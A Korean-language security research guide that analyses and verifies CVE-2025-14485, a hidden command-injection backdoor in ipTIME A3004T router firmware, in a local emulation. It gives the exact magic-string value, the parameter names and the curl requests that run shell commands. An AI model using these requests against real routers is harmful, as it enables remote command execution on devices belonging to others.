# CMDI-B-timepro-debug (== CVE-2025-14485): timepro.cgi 숨겨진 디버그 백도어 — 검증 가이드

> **CGI(Common Gateway Interface)란?** 웹 브라우저가 특정 URL(예: `/cgibin/d.cgi`)에 접속하면, 웹 서버가 그 이름에 해당하는 프로그램을 실행시켜서 그 결과(HTML 등)를 브라우저에 돌려주는 방식이다. 즉 `timepro.cgi`는 "웹 페이지처럼 보이지만 사실은 매 요청마다 새로 실행되는 프로그램"이다.

## 한눈에 요약

- 어떤 버그: 벤더가 넣어둔 숨겨진 디버그 화면(`show_debug_screen()`)에서, `cmd` 파라미터 값을 검사 없이 그대로 셸 명령으로 실행한다.
- 어디서: `cgibin/timepro.cgi` (`/cgibin/d.cgi` 심볼릭 링크로 접근)
- 왜 위험한가: `popen()`으로 셸 명령을 그대로 실행시키고, 그 출력을 웹 페이지에 그대로 돌려준다.
- **이 finding == 공개된 CVE-2025-14485.** 이 이미지(`a3004t_ml_14_190`, 버전 문자열 `14.190` = "14.19.0")는 그 CVE 공식 문서가 명시한 바로 그 버전이다. 다만 공개 문서의 매직 문자열 값에는 오타(글자 하나 누락)가 있다 — 아래 4번 항목의 값이 디컴파일로 직접 검증한 정확한 값이다.
- 인증 필요 여부: "원격지원 옵션 켜짐" + "관리자 비밀번호가 기본값이 아님" + "Referer가 Host와 일치(CSRF 방어 통과)" + "숨겨진 매직 문자열을 알고 있음" + "argv[0]/요청 경로가 정확히 `/cgibin/d.cgi`" — 이 다섯 가지가 모두 맞아야 하는 조건부 백도어. **이번 세션에 5개 게이트 전부의 정확한 요구조건을 디컴파일로 밝혀내고, 실제로 QEMU에서 `popen()` 실행 + 명령 출력 캡처까지 완료했다 (Evidence 3).**

---

## 1. 이 취약점이 뭔가요?

**OS Command Injection(운영체제 명령어 삽입)** 은, 프로그램이 사용자가 보낸 문자열을 걸러내지 않고 그대로 셸(shell) 명령어 안에 넣어 실행할 때 생긴다. 이 경우는 벤더가 디버깅용으로 심어둔 "뒷문" 코드가 원인이다 — 애초에 필터링을 아예 하지 않는다.

## 2. 코드에서 무슨 일이 벌어지나요? (소스 → 싱크 경로)

`show_debug_screen`이라는 함수(주소 `0x00410e00`)는 다음 조건을 순서대로 통과해야 실행된다:

```c
iVar1 = get_remote_support();               // 관리자가 켠 "원격지원" 옵션인지 확인
if ((iVar1 != 0) &&
    (iVar1 = check_default_pass(), iVar1 == 0)) {   // 비밀번호가 "기본값이 아님"(=이미 바꿈)인지 확인
    // aaksjdkfj 파라미터 값을 17바이트 매직 문자열과 한 글자씩 비교
    // (디컴파일 원본에서 직접 이어붙인 정확한 값: "!@dnjsrurelqjrm*&")
```

매직 문자열까지 맞으면, 진짜 취약한 부분에 도달한다:

```c
strcpy(popen_buf, "2>&1 ");                              // 고정 접두어 (5바이트, null 없음)
get_value(param_1, "cmd", popen_buf+5, 0xfb);             // cmd 파라미터, 최대 251바이트, 검사 없음 — 바로 뒤에 이어붙여짐
strcpy(popen_buf + strlen(popen_buf), " 2>&1");           // 고정 접미어
popen(popen_buf, "r");     // *** 여기가 진짜 실행 지점(sink) ***
```

최종적으로 셸에 넘어가는 문자열은 `"2>&1 " + <cmd 값> + " 2>&1"` 형태다 — `cmd` 값에 셸 메타문자(`;`, `` ` ``, `$(...)` 등)를 넣으면 임의 명령이 실행된다.

## 3. CVE-2025-14485와의 관계

공개된 VulDB/NVD 설명: "EFM ipTIME A3004T 14.19.0, `show_debug_screen`, `/sess-bin/timepro.cgi`, 파라미터 `aaksjdkfj`, 값 `!@dnjsrureljrm*&`로 명령어 삽입 발생." 이 이미지의 버전 파일(`home/httpd/version`)이 정확히 `14.190`이라 이 CVE의 실제 대상 바이너리다.

**공개 문서의 매직 문자열에는 'q'가 하나 빠져 있다.** `show_debug_screen`의 17개 1바이트 비교(`logs/02-decompile-known-vulns.log:691-846`)를 순서대로 이어붙이면 정확한 값은:

```
!@dnjsrurelqjrm*&
```

이며, 이 값으로만 게이트를 통과한다 (공개된 값을 그대로 쓰면 실패한다).

이번 세션에 이전까지 미해결이던 갭도 해소했다 — **매직 문자열을 담는 실제 HTTP 파라미터 이름이 `aaksjdkfj`라는 것**은 CVE 문서와, 바이너리 자체의 `<input type=text name="aaksjdkfj" value="%s" size=64 maxlength=256>` HTML 문자열을 직접 대조해서 확정했다 (이전 세션들은 이 이름을 몰라서 `<매직_문자열_키>`라는 자리표시자로만 남겨뒀었다).

## 4. 요청 파라미터 전체 표

| 파라미터 | 역할 |
|---|---|
| `act` | `1`이어야 함 (폼의 hidden 필드 값) |
| `aaksjdkfj` | 매직 문자열 게이트, 값 `!@dnjsrurelqjrm*&` |
| `cmd` | **실제 주입 지점**, 최대 251바이트, `popen()`으로 그대로 전달 |
| `fname` (선택) | 지정하면 해당 경로 파일을 열어서 내용을 웹페이지에 그대로 출력 (경로 검증 없음 — 별개의 작은 파일 읽기 취약점) |
| `fdump` (선택) | 특정 내부 값과 일치하면 `cmd`/`popen()` 경로를 건너뛰고 `fname` 파일 덤프만 수행 — **비워두거나 생략해야** `cmd` 주입 경로로 간다 |

## 5. 게이트 전체 정리 (이번 세션에 5개 전부 디컴파일로 정확히 규명함)

| 게이트 | 함수(주소) | 정확한 요구조건 |
|---|---|---|
| 1 | `get_remote_support()` (`timepro.cgi @ 0x0040d42c`) | `iconfig_get_intvalue_direct("remote_support")` != 0. 출하 기본 설정 파일엔 이 키가 없음 → **기본값은 꺼짐**, 관리자가 UI에서 켜야 함. |
| 2 | `check_default_pass()` (`libsysauth.so @ 0x11080`) | **평문 비밀번호 비교가 아니다.** `sys_auth_cred`라는 설정 키(값 = `hex(SHA256(로그인))+hex(SHA256(비밀번호))`, 128자리 16진수)를 읽어서, 공장 초기값("admin"/"admin")의 해시와 비교한다. 저장된 값이 이 초기값 해시와 달라야("비밀번호를 실제로 바꿨어야") 통과. |
| 3 | `check_csrf_attack()` → `FUN_00034ba4` (Referer/Host 비교) (`libesysapi.so @ 0x34dfc`/`0x34ba4`) | `csrf_op` 키도 기본 설정에 없어서 **기본값은 켜짐(1)**. `getenv("REFERER")`/`getenv("HOST")` — **표준 `HTTP_REFERER`/`HTTP_HOST`가 아니라 접두어 없는 이름**을 직접 읽는다. Referer의 호스트 부분이 Host 헤더와 일치해야 통과(또는 CSRF 화이트리스트에 등록). **실제로 동작하는 CSRF 방어**라서, 외부 사이트에서의 일반적인 CSRF로는 Referer를 라우터 자신의 호스트로 위조할 수 없어 막힌다 — same-origin(예: 라우터 자체 XSS) 이거나 화이트리스트 등록이 필요. |
| 4 | 최상위 디스패처 `strcmp(argv[0], "/cgibin/d.cgi")` (`logs/04-set-ftm-callers.log:556-565`) | 요청 경로가 정확히 `/cgibin/d.cgi`여야 함(`/cgibin/timepro.cgi` 직접 호출은 다른 코드로 라우팅되어 조용히 실패). |
| 5 | 17바이트 매직 문자열 | `aaksjdkfj` 파라미터 값이 정확히 `!@dnjsrurelqjrm*&`. |

**게이트 2, 3이 바로 이전 세션에서 실패했던 원인이다** — 이전 테스트 설정은 무의미한 `password=` 평문 필드를 채웠을 뿐 `sys_auth_cred` 키는 전혀 몰랐고, Referer/Host CSRF 체크의 존재 자체도 몰랐다. 둘 다 GDB 없이, `check_default_pass()`/`check_csrf_attack()`이 호출하는 한 단계 더 안쪽 함수(`sysauth_get_cred`/`sysauth_create_creds`, `FUN_00034ba4`)까지 Ghidra 디컴파일로 파고들어서 해결했다.

## 6. 환경 실행하기 (자동화됨)

### 준비물
- `qemu-mipsel-static`
- `bwrap` (bubblewrap — sudo 불필요)
- Python 3

### 왜 bwrap이 필요한가

`get_remote_support()`/`check_default_pass()`는 `/etc/iconfig.cfg`(라우터의 설정 저장소)를 절대경로로 읽는다. `stage_rootfs.sh`의 `-L` 격리는 동적 링커의 라이브러리 검색 경로만 바꿔줄 뿐, 이런 절대경로 `open()`은 실제 호스트의 `/etc`를 그대로 건드린다. `run.sh`는 `bwrap`으로 **이 프로세스만을 위한 격리된 마운트 네임스페이스**를 만들어서, 실제 호스트 `/etc`는 전혀 건드리지 않으면서 `/etc/iconfig.cfg`만 우리가 준비한 가짜 설정 파일(`remote_support=1`, `sys_auth_cred=<기본값이 아닌 해시>`)로 보이게 한다 — 프로세스가 끝나면 흔적 없이 사라진다. `--referer`/`--host` 옵션(이번 세션에 `cgi_verify_bridge.py`에 새로 추가)으로 게이트 3(Referer/Host CSRF 체크)도 함께 통과시킨다.

### 실행
```bash
cd analysis/emulation/CMDI-B-timepro-debug
bash run.sh
```
포트를 지정하고 싶으면 `bash run.sh 8082`처럼 인자로 줄 수 있다(기본값 8082). 이후 다른 터미널에서 `curl "http://127.0.0.1:8082/?...파라미터..."`로 접근한다.

### 재현 조건 요약 — kit이 자동으로 채우는 것 vs 직접 입력해야 하는 것

`run.sh`를 켜둔 상태에서는 **URL 경로나 헤더를 신경 쓸 필요 없이 쿼리스트링만 맞춰서 GET하면 바로 재현된다.** 이유는 게이트 5개 중 4개를 `run.sh`/`cgi_verify_bridge.py`가 서버 쪽에서 이미 고정값으로 시뮬레이션해주기 때문이다:

| # | 게이트 | 실제 라우터에서 필요한 조건 | 이 kit에서는? | 사용자가 추가로 할 일 |
|---|---|---|---|---|
| 1 | `remote_support` NVRAM | 관리자가 UI에서 원격지원 옵션을 켜둔 상태 | `run.sh`가 `test_iconfig.cfg`에 `remote_support=1`로 심어둠 (자동) | 없음 |
| 2 | `sys_auth_cred` (비밀번호 변경됨) | 관리자가 기본 admin/admin에서 비밀번호를 실제로 바꾼 상태 | `run.sh`가 비-기본 해시값을 심어둠 (자동) | 없음 |
| 3 | Referer/Host CSRF (`REFERER`/`HOST` env) | 요청의 Referer 호스트가 실제 라우터 Host와 일치(= same-origin) | `cgi_verify_bridge.py --referer/--host` 플래그로 서버가 하드코딩 — **클라이언트가 실제로 보낸 헤더는 무시됨** (자동) | 없음 |
| 4 | `argv[0]` == `/cgibin/d.cgi` | 요청 경로가 정확히 그 경로여야 함 | `--url-path /cgibin/d.cgi` 플래그로 고정 — **클라이언트가 실제로 요청한 URL 경로와 무관** (자동) | 없음 |
| 5 | 17바이트 매직 문자열 (`aaksjdkfj`) | 값을 알고 있어야 함 | 채워주지 않음 | 쿼리스트링에 `aaksjdkfj=<urlencoded 매직 문자열>` 포함 |
| — | 명령 주입 (`cmd`) | — | — | 쿼리스트링에 `cmd=<실행할 명령>` 포함 |

**즉 실제로 손으로 넣어야 하는 값은 `act=1` + `aaksjdkfj=<매직 문자열>` + `cmd=<명령>` 세 개뿐이다** (예시는 아래 7번 참고). 나머지 네 게이트는 이미 `run.sh`가 통과시켜 놓은 상태이므로, curl에 `-H "Referer: ..."` 같은 헤더를 따로 줄 필요가 없고 브라우저 주소창에 직접 URL을 쳐도 동일하게 동작한다.

**주의**: 이건 `popen()` 싱크 자체가 진짜로 실행되는지를 검증하기 위한 시뮬레이션이며, "아무나 바로 pre-auth로 뚫을 수 있다"는 뜻이 아니다. 실제 라우터를 상대로는 공격자가 여전히 4개 조건(원격지원 켜짐, 비밀번호가 이미 변경됨, 라우터와 동일 오리진에서 요청이 나감, 정확한 URL 경로)을 별도로 만족시켜야 한다 — 자세한 내용은 위 5번 게이트 표와 아래 9번(심각도) 참고.

## 7. 실제로 검증해보기 — Evidence 3 확보 완료

`bash run.sh`로 실행하면 5개 게이트(원격지원, `sys_auth_cred`, Referer/Host, argv0, 매직 문자열) 중 argv0/Referer/Host/원격지원/sys_auth_cred는 이미 `run.sh`가 채워둔다. 남은 건 URL 파라미터뿐이다.

**대조군(매직 문자열만 틀림, 나머지 전부 정확) — 실행 완료, 예상대로 차단됨:**
```bash
curl -s "http://127.0.0.1:8082/?act=1&aaksjdkfj=wrongvalue&cmd=touch+/tmp/pwned_cve14485"
```
응답은 `Content-type` 헤더 한 줄뿐, 폼도 명령 실행도 없음 — 마커 파일 미생성. (`logs/evidence3_negative_control.out`)

**실제 검증(매직 문자열 정확) — 실행 완료, 성공:**
```bash
MAGIC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('!@dnjsrurelqjrm*&'))")
curl -s "http://127.0.0.1:8082/?act=1&aaksjdkfj=${MAGIC}&cmd=id"
```
응답 본문에 `<pre>uid=1000 gid=1000 groups=1000,65534</pre>` — **`id` 명령이 실제로 라우터 내부(에뮬레이션 환경) 셸에서 실행되고, 그 출력이 그대로 웹 페이지에 찍힌 것을 확인했다.** (`logs/evidence3_positive_id.out`) `cmd=touch /tmp/pwned_cve14485`로도 실제 마커 파일이 호스트에 생성됨을 확인함(`logs/evidence3_positive_touch.out`, 확인 후 삭제 완료).

막혔던 진짜 원인은 게이트 2(`check_default_pass()`가 평문 비밀번호가 아니라 `sys_auth_cred` 해시 키를 읽음)와 게이트 3(`REFERER`/`HOST` 환경변수 기반 CSRF 체크, 표준 `HTTP_` 접두어가 아님) — 둘 다 몰랐던 부분이라 이전 세션 테스트가 조용히 실패했었다. 상세 근거: `results.md`, `logs/05-decompile-gates.log`.

## 8. 성공하면 어떻게 보이나요?

`cmd=id`가 실제로 실행되면, `popen()`이 읽어온 출력(`uid=... gid=... groups=...`)이 웹 페이지 응답 본문에 `<pre>...</pre>`로 그대로 찍힌다. **이번 세션에 이 상태에 실제로 도달했다** — 위 7번의 캡처된 출력 참고.

## 9. 이게 왜 심각한가요?

- 벤더가 의도적으로 심어둔 백도어이지만 pre-auth는 아니다. CVE 공식 CVSS(`AC:H/PR:L`)도 같은 결론이다 — 낮은 권한(관리자 세션 등)이 이미 필요하고 공격 복잡도가 높다.
- **CSRF 방어(게이트 3)는 실제로 작동한다** — 일반적인 "외부 악성 페이지에서 관리자 브라우저로 요청 쏘기" 방식의 CSRF로는 Referer를 라우터 자신의 호스트로 위조할 수 없어 막힌다. 이 백도어를 트리거하려면 (a) 라우터 자체에 대한 별개의 XSS(같은 오리진에서 요청이 나가므로 Referer가 자동으로 일치), (b) 관리자가 이미 CSRF 화이트리스트에 공격자 오리진을 등록해둔 경우, 또는 (c) 공격자가 이미 관리자 세션/자격증명을 직접 확보한 경우 중 하나가 필요하다 — 단순 CSRF 링크 클릭 한 번으로는 부족하다.
- 그럼에도 심각한 이유: popen()으로 이어지는 검증 없는 백도어라는 설계 자체가 문제이며, 위 세 경로 중 하나라도 확보한 공격자에게는 완전한 RCE로 직결된다. `sys_auth_cred`/`csrf_op`/`remote_support` 세 설정 키 모두 공장 출하 설정 파일엔 존재하지 않는다 — 즉 "관리자가 한 번도 비밀번호를 안 바꾼 순수 공장 초기화 상태"에서는 게이트 2가 항상 막아준다는 뜻이기도 하다.

## 10. 참고 자료

- 정적 분석 원본: `../../candidates/CMDI-B-timepro-debug.md`
- 동적 검증 상세 로그/결론: `results.md`, `logs/05-decompile-gates.log`, `logs/evidence3_*.out`, `logs/strace_before_argv0_fix.log`, `logs/strace_after_argv0_fix.log`
- `show_debug_screen` 전체 디컴파일: `../../../logs/02-decompile-known-vulns.log`
- 자매 이미지(`a3004t_ml_14_194`) 쪽 문서: `../../../a3004t_ml_14_194/analysis/candidates/CMDI-B-timepro-debug.md`
